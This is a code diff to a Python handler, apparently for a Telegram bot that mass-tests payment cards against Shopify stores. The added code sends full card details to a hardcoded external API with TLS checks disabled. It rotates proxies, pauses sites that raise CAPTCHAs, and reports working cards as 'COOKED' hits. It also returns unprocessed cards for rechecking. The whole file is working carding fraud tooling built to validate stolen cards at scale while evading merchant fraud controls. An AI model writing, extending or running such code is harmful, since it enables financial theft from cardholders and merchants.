@@ -1,4 +1,5 @@
-# complete_handler.py – FINAL VERSION with all Onyx gates, 200‑card limit for non‑owners, and live progress with last result
+# complete_handler.py – FINAL VERSION with Onyx gates, 200‑card limit for non‑owners, live progress,
+# and now temporary API integration for Shopify mass checks.
 
 import requests
 import time
@@ -325,6 +326,240 @@ def save_user_sites_list(user_id, sites_list):
     data = load_user_sites()
     data[str(user_id)] = sites_list
     save_user_sites(data)
+
+# ============================================================================
+# TEMPORARY API INTEGRATION FOR SHOPIFY CHECKS
+# ============================================================================
+API_BASE_URL = "http://49.12.210.122:5000/check"
+
+def api_check_site(site_url, cc, proxy=None):
+    """
+    Calls the external API to check a card on a Shopify site.
+    Returns the JSON response or raises an exception.
+    """
+    params = {
+        'card': cc,
+        'site': site_url
+    }
+    if proxy:
+        params['proxy'] = proxy
+    try:
+        # Use a timeout of 15 seconds (adjust as needed)
+        r = requests.get(API_BASE_URL, params=params, timeout=15, verify=False)
+        r.raise_for_status()
+        return r.json()
+    except Exception as e:
+        # Return an error dict that can be processed uniformly
+        return {'status': 'error', 'message': str(e)}
+
+def process_api_response(api_response, price):
+    """
+    Converts the API response into the format expected by the mass‑check engine.
+    Returns (response_text, status, gateway).
+    """
+    status_raw = api_response.get('status', 'error').upper()
+    message = api_response.get('message', 'No message')
+    # Treat 'APPROVED' as cooked, 'DECLINED' as dead, everything else as error
+    if status_raw == 'APPROVED':
+        return message, 'APPROVED', 'API'
+    elif status_raw == 'DECLINED':
+        return message, 'DECLINED', 'API'
+    else:
+        return message, 'ERROR', 'API'
+
+# ============================================================================
+# MASS CHECK ENGINE FOR API (Shopify only)
+# ============================================================================
+def process_api_mass_check(bot, message, start_msg, ccs, site_list, proxies,
+                           user_id, users_data, save_json_func, users_file, hit_pref="both"):
+    """
+    Performs a mass check using the external API.
+    """
+    total = len(ccs)
+    results = {"live": [], "dead": [], "error": [], "approved": [], "cooked": []}
+    error_cards = []
+    chat_id = message.chat.id
+    sites_lock = threading.Lock()
+    temp_site_ban = {}
+    TEMP_BAN_TIME = 120
+    current_sites = site_list.copy()
+    current_proxies = proxies.copy()
+    clear_stop(chat_id)
+
+    def get_bin_info_local(card_number):
+        return get_bin_info(card_number)
+
+    def error_result(cc, reason):
+        return {
+            'cc': cc, 'response': reason, 'status': 'ERROR', 'gateway': 'Unknown',
+            'price': '0.00', 'site': 'N/A', 'site_url': 'N/A', 'proxy_used': None,
+            'bin_info': get_bin_info_local(cc.split('|')[0]), 'timestamp': datetime.now().isoformat()
+        }
+
+    def check_card_concurrent(cc, site_list, proxy_list, max_retries=3):
+        try:
+            with sites_lock:
+                available_sites = []
+                now = time.time()
+                for s in site_list:
+                    url = s['url']
+                    if url in temp_site_ban:
+                        if now < temp_site_ban[url]:
+                            continue
+                        else:
+                            del temp_site_ban[url]
+                    available_sites.append(s)
+            if not available_sites:
+                return error_result(cc, 'All sites temporarily paused (CAPTCHA cooldown)')
+            sites_to_try = random.sample(available_sites, min(max_retries, len(available_sites)))
+            for site_obj in sites_to_try:
+                site_url = site_obj['url']
+                site_name = site_obj.get('name', site_url)
+                price = site_obj.get('price', '0.00')
+                gateway = site_obj.get('gateway', 'Unknown')
+                tried_proxies = []
+                for proxy_attempt in range(2):
+                    available_proxies = [p for p in proxy_list if p not in tried_proxies]
+                    if not available_proxies:
+                        break
+                    proxy = random.choice(available_proxies)
+                    tried_proxies.append(proxy)
+                    try:
+                        # Call the API
+                        api_resp = api_check_site(site_url, cc, proxy)
+                        response_text, status, gateway_result = process_api_response(api_resp, price)
+                        response_upper = (response_text or "").upper()
+                        is_captcha = "CAPTCHA" in response_upper
+                        if not is_captcha and status not in ['ERROR', 'TIMEOUT']:
+                            bin_info = get_bin_info_local(cc.split('|')[0])
+                            return {
+                                'cc': cc,
+                                'response': response_text,
+                                'status': status,
+                                'gateway': gateway_result or gateway,
+                                'price': price,
+                                'site': site_name,
+                                'site_url': site_url,
+                                'proxy_used': proxy,
+                                'bin_info': bin_info,
+                                'timestamp': datetime.now().isoformat()
+                            }
+                        elif is_captcha:
+                            with sites_lock:
+                                temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
+                            break
+                        else:
+                            continue
+                    except Exception as e:
+                        continue
+            return error_result(cc, 'All retries failed (Network Timeouts)')
+        except Exception as e:
+            return error_result(cc, str(e))
+
+    status_msg = start_msg  # already sent
+    processed = 0
+    start_time = time.time()
+    last_update_time = time.time()
+    last_card_result = ""
+
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {}
+        for i, cc in enumerate(ccs):
+            if is_stop_requested(chat_id):
+                error_cards.extend(ccs[i:])
+                break
+            future = executor.submit(check_card_concurrent, cc, current_sites, current_proxies, 3)
+            futures[future] = cc
+
+        for future in as_completed(futures):
+            if is_stop_requested(chat_id):
+                for f in futures:
+                    if not f.done():
+                        f.cancel()
+            processed += 1
+            try:
+                res = future.result(timeout=120)
+                status = res['status']
+                if status == 'STOPPED':
+                    results['error'].append(res)
+                    error_cards.append(res['cc'])
+                    last_card_result = f"⛔ {res['cc'][:16]}... | {res['response']}"
+                elif status == 'APPROVED':
+                    results['cooked'].append(res)
+                    if hit_pref in ["both", "cooked"]:
+                        send_hit(bot, chat_id, res, "🔥 COOKED", user_id, hit_pref)
+                    last_card_result = f"🔥 {res['cc'][:16]}... | COOKED"
+                elif status == 'APPROVED_OTP':
+                    results['approved'].append(res)
+                    if hit_pref == "both":
+                        send_hit(bot, chat_id, res, "✅ APPROVED", user_id, hit_pref)
+                    last_card_result = f"✅ {res['cc'][:16]}... | OTP"
+                elif status in ['DECLINED', 'EXPIRED']:
+                    results['dead'].append(res)
+                    last_card_result = f"❌ {res['cc'][:16]}... | {res['response']}"
+                else:
+                    results['error'].append(res)
+                    error_cards.append(res['cc'])
+                    last_card_result = f"⚠️ {res['cc'][:16]}... | {res['response']}"
+            except FutureTimeoutError:
+                cc = futures[future]
+                results['error'].append(error_result(cc, 'Card check timeout (>120s)'))
+                error_cards.append(cc)
+                last_card_result = f"⏱️ {cc[:16]}... | TIMEOUT"
+            except Exception as e:
+                cc = futures[future]
+                results['error'].append(error_result(cc, str(e)))
+                error_cards.append(cc)
+                last_card_result = f"⚠️ {cc[:16]}... | {str(e)[:30]}"
+
+            # Update progress every 10 seconds
+            if time.time() - last_update_time > 10.0 or processed == total or is_stop_requested(chat_id):
+                try:
+                    elapsed = time.time() - start_time
+                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
+                    avg_time = elapsed / processed if processed > 0 else 0
+                    progress = create_progress_bar(processed, total)
+                    msg_text = (f"<b>⚡ API‑Powered Shopify Multi‑Site Checking...</b>\n{progress}\n"
+                                f"📊 <b>Progress:</b> {processed}/{total}\n"
+                                f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
+                                f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
+                                f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
+                                f"⚠️ <b>Errors:</b> {len(results.get('error', []))}\n"
+                                f"⚡ <b>CPM:</b> {cpm:.1f}\n"
+                                f"⏱️ <b>Avg Time:</b> {avg_time:.1f}s/card\n"
+                                f"📌 <b>Last:</b> {last_card_result}")
+                    safe_send(bot.edit_message_text, msg_text, chat_id, status_msg.message_id, parse_mode="HTML")
+                    last_update_time = time.time()
+                except:
+                    pass
+
+            if is_stop_requested(chat_id):
+                break
+
+    clear_stop(chat_id)
+    increment_usage(user_id, processed, users_data, save_json_func, users_file)
+
+    duration = time.time() - start_time
+    final_text = (f"<b>✅ API‑Powered Shopify Multi‑Site Completed</b>\n━━━━━━━━━━━━━━━━\n"
+                  f"💳 <b>Total Checked:</b> {processed}\n"
+                  f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
+                  f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
+                  f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
+                  f"⚠️ <b>Errors:</b> {len(results.get('error', []))}\n"
+                  f"⏱️ <b>Time Taken:</b> {duration:.2f}s")
+    try:
+        safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
+    except:
+        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
+
+    if error_cards and len(error_cards) < total:
+        content = "\n".join(error_cards)
+        filename = f"error_cards_{chat_id}.txt"
+        with open(filename, 'w') as f:
+            f.write(content)
+        with open(filename, 'rb') as f:
+            safe_send(bot.send_document, chat_id, f, caption="⚠️ Cards that were not processed successfully – you may recheck these.")
+        os.remove(filename)
 
 # ============================================================================
 # MAIN HANDLER SETUP
@@ -669,13 +904,12 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             return
         start_msg = safe_send(bot.send_message,
             message.chat.id,
-            f"🔥 <b>Starting Shopify Multi-Site...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies\n📋 Hit preference: {hit_pref}",
+            f"🔥 <b>Starting API‑Powered Shopify Multi‑Site...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies\n📋 Hit preference: {hit_pref}",
             parse_mode='HTML')
         def mass_thread():
             try:
-                process_mass_check_engine(
+                process_api_mass_check(  # <--- using the new API engine
                     bot, message, start_msg, ccs, site_list, active_proxies,
-                    check_site_func, process_response_func, update_stats_func,
                     user_id, users_data, save_json_func, users_file, hit_pref
                 )
             finally:
@@ -836,209 +1070,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except: pass
 
     # ========================================================================
-    # SHOPIFY MASS CHECK ENGINE (with CAPTCHA site ban 120s)
-    # ========================================================================
-    def process_mass_check_engine(bot, message, start_msg, ccs, sites, proxies,
-                                  check_site_func, process_response_func, update_stats_func,
-                                  user_id, users_data, save_json_func, users_file, hit_pref="both"):
-        try:
-            total = len(ccs)
-            results = {"live": [], "dead": [], "error": [], "approved": [], "cooked": []}
-            error_cards = []  # cards that were not processed due to stop or errors
-            chat_id = message.chat.id
-            sites_lock = threading.Lock()
-            temp_site_ban = {}
-            TEMP_BAN_TIME = 120
-            current_sites = sites.copy()
-            current_proxies = proxies.copy()
-            clear_stop(chat_id)
-
-            def get_bin_info_local(card_number):
-                return get_bin_info(card_number)
-
-            def error_result(cc, reason):
-                return {
-                    'cc': cc, 'response': reason, 'status': 'ERROR', 'gateway': 'Unknown',
-                    'price': '0.00', 'site': 'N/A', 'site_url': 'N/A', 'proxy_used': None,
-                    'bin_info': get_bin_info_local(cc.split('|')[0]), 'timestamp': datetime.now().isoformat()
-                }
-
-            def check_card_concurrent(cc, site_list, proxy_list, check_function, max_retries=3):
-                try:
-                    with sites_lock:
-                        available_sites = []
-                        now = time.time()
-                        for s in site_list:
-                            url = s['url']
-                            if url in temp_site_ban:
-                                if now < temp_site_ban[url]:
-                                    continue
-                                else:
-                                    del temp_site_ban[url]
-                            available_sites.append(s)
-                    if not available_sites:
-                        return error_result(cc, 'All sites temporarily paused (CAPTCHA cooldown)')
-                    sites_to_try = random.sample(available_sites, min(max_retries, len(available_sites)))
-                    for site_obj in sites_to_try:
-                        site_url = site_obj['url']
-                        site_name = site_obj.get('name', site_url)
-                        price = site_obj.get('price', '0.00')
-                        gateway = site_obj.get('gateway', 'Unknown')
-                        tried_proxies = []
-                        for proxy_attempt in range(2):
-                            available_proxies = [p for p in proxy_list if p not in tried_proxies]
-                            if not available_proxies: break
-                            proxy = random.choice(available_proxies)
-                            tried_proxies.append(proxy)
-                            try:
-                                api_response = check_function(site_url, cc, proxy)
-                                bin_info = get_bin_info_local(cc.split('|')[0])
-                                response, status, gateway_result = process_response_func(api_response, price)
-                                response_upper = (response or "").upper()
-                                is_captcha = "CAPTCHA" in response_upper
-                                if not is_captcha and status not in ['ERROR', 'TIMEOUT']:
-                                    return {
-                                        'cc': cc, 'response': response, 'status': status,
-                                        'gateway': gateway_result or gateway, 'price': price,
-                                        'site': site_name, 'site_url': site_url, 'proxy_used': proxy,
-                                        'bin_info': bin_info, 'timestamp': datetime.now().isoformat()
-                                    }
-                                elif is_captcha:
-                                    with sites_lock:
-                                        temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
-                                    break
-                                else:
-                                    continue
-                            except Exception as e:
-                                continue
-                    return error_result(cc, 'All retries failed (Network Timeouts)')
-                except Exception as e:
-                    return error_result(cc, str(e))
-
-            status_msg = safe_send(bot.send_message,
-                chat_id,
-                f"<b>⚡ Shopify Multi-Site Started...</b>\n💳 Cards: {total}\n🌐 Live Proxies: {len(proxies)}\n📋 Hit preference: {hit_pref}\n<i>Use /stop to abort</i>",
-                parse_mode="HTML")
-
-            processed = 0
-            start_time = time.time()
-            last_update_time = time.time()
-            last_card_result = ""   # store last result for live update
-
-            with ThreadPoolExecutor(max_workers=10) as executor:
-                futures = {}
-                for i, cc in enumerate(ccs):
-                    if is_stop_requested(chat_id):
-                        # Add all remaining cards to error_cards
-                        error_cards.extend(ccs[i:])
-                        break
-                    future = executor.submit(check_card_concurrent, cc, current_sites, current_proxies, check_site_func, max_retries=3)
-                    futures[future] = cc
-
-                for future in as_completed(futures):
-                    if is_stop_requested(chat_id):
-                        # Cancel remaining futures (optional)
-                        for f in futures:
-                            if not f.done():
-                                f.cancel()
-                    processed += 1
-                    try:
-                        res = future.result(timeout=120)
-                        status = res['status']
-                        if status == 'STOPPED':
-                            results['error'].append(res)
-                            error_cards.append(res['cc'])
-                            last_card_result = f"⛔ {res['cc'][:16]}... | {res['response']}"
-                        elif status == 'APPROVED':
-                            results['cooked'].append(res)
-                            if hit_pref in ["both", "cooked"]:
-                                send_hit(bot, chat_id, res, "🔥 COOKED", user_id, hit_pref)
-                            update_stats_func('APPROVED', mass_check=True)
-                            last_card_result = f"🔥 {res['cc'][:16]}... | COOKED"
-                        elif status == 'APPROVED_OTP':
-                            results['approved'].append(res)
-                            if hit_pref == "both":
-                                send_hit(bot, chat_id, res, "✅ APPROVED", user_id, hit_pref)
-                            update_stats_func('APPROVED_OTP', mass_check=True)
-                            last_card_result = f"✅ {res['cc'][:16]}... | OTP"
-                        elif status in ['DECLINED', 'EXPIRED']:
-                            results['dead'].append(res)
-                            update_stats_func('DECLINED', mass_check=True)
-                            last_card_result = f"❌ {res['cc'][:16]}... | {res['response']}"
-                        else:
-                            results['error'].append(res)
-                            error_cards.append(res['cc'])
-                            update_stats_func('ERROR', mass_check=True)
-                            last_card_result = f"⚠️ {res['cc'][:16]}... | {res['response']}"
-                    except FutureTimeoutError:
-                        cc = futures[future]
-                        results['error'].append(error_result(cc, 'Card check timeout (>120s)'))
-                        error_cards.append(cc)
-                        update_stats_func('ERROR', mass_check=True)
-                        last_card_result = f"⏱️ {cc[:16]}... | TIMEOUT"
-                    except Exception as e:
-                        cc = futures[future]
-                        results['error'].append(error_result(cc, str(e)))
-                        error_cards.append(cc)
-                        update_stats_func('ERROR', mass_check=True)
-                        last_card_result = f"⚠️ {cc[:16]}... | {str(e)[:30]}"
-
-                    # Update progress every 10 seconds or at the end
-                    if time.time() - last_update_time > 10.0 or processed == total or is_stop_requested(chat_id):
-                        try:
-                            elapsed = time.time() - start_time
-                            cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
-                            avg_time = elapsed / processed if processed > 0 else 0
-
-                            progress = create_progress_bar(processed, total)
-                            msg_text = (f"<b>⚡ Shopify Multi-Site Checking...</b>\n{progress}\n"
-                                        f"📊 <b>Progress:</b> {processed}/{total}\n"
-                                        f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
-                                        f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
-                                        f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
-                                        f"⚠️ <b>Errors:</b> {len(results.get('error', []))}\n"
-                                        f"⚡ <b>CPM:</b> {cpm:.1f}\n"
-                                        f"⏱️ <b>Avg Time:</b> {avg_time:.1f}s/card\n"
-                                        f"📌 <b>Last:</b> {last_card_result}")
-                            safe_send(bot.edit_message_text, msg_text, chat_id, status_msg.message_id, parse_mode="HTML")
-                            last_update_time = time.time()
-                        except:
-                            pass
-
-                    if is_stop_requested(chat_id):
-                        break
-
-            clear_stop(chat_id)
-            increment_usage(user_id, processed, users_data, save_json_func, users_file)
-
-            duration = time.time() - start_time
-            final_text = (f"<b>✅ Shopify Multi-Site Completed</b>\n━━━━━━━━━━━━━━━━\n"
-                          f"💳 <b>Total Checked:</b> {processed}\n"
-                          f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
-                          f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
-                          f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
-                          f"⚠️ <b>Errors:</b> {len(results.get('error', []))}\n"
-                          f"⏱️ <b>Time Taken:</b> {duration:.2f}s")
-            try:
-                safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
-            except:
-                safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
-
-            if error_cards and len(error_cards) < total:
-                content = "\n".join(error_cards)
-                filename = f"error_cards_{chat_id}.txt"
-                with open(filename, 'w') as f:
-                    f.write(content)
-                with open(filename, 'rb') as f:
-                    safe_send(bot.send_document, chat_id, f, caption="⚠️ Cards that were not processed successfully – you may recheck these.")
-                os.remove(filename)
-
-        except Exception as e:
-            safe_send(bot.send_message, message.chat.id, f"❌ Mass check engine crashed: {str(e)}")
-            logger.error(traceback.format_exc())
-
-    # ========================================================================
-    # PAYPAL MASS CHECK ENGINE (generic, used by all non‑Shopify gates)
+    # GENERIC PAYPAL MASS CHECK ENGINE (used by non‑Shopify gates)
     # ========================================================================
     def process_paypal_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                                   proxies, user_id, users_data, save_json_func, users_file):
@@ -1179,4 +1211,4 @@ Owner :- @Unknown_bolte
     return {
         'get_user_sites': get_user_sites,
         'save_user_sites_list': save_user_sites_list,
-            }
+        }
